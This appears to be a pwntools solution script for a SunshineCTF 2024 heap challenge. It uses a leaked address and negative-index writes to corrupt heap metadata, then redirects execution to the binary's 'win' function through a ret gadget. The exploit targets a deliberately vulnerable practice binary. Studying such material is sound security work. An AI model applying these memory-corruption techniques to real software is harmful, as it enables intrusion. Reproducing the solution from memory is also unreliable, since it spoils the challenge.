from pwn import *

exe = ELF("heap01_patched")
libc = ELF("./libc.so.6")
context.binary = exe

p = process([exe.path])
# p = remote("2024.sunshinectf.games", 24006)

p.sendlineafter(b"leak?", b"k")
p.recvline()
leak = int(p.recvline().strip(), 16)
log.info(f"{hex(leak)=}")

p.sendlineafter(b"size:", b"20")
p.sendlineafter(b"Index:", b"-596")
p.sendlineafter(b"Value:", str(0x1).encode())
p.sendlineafter(b"Index:", b"-580")
p.sendlineafter(b"Value:", str(leak+0x28).encode())

p.sendlineafter(b"Value 1:", b"0")
p.sendlineafter(b"Value 2 -", str(0x40101a).encode())
p.sendlineafter(b"Value 3 ->", str(exe.sym["win"]).encode())

p.interactive()
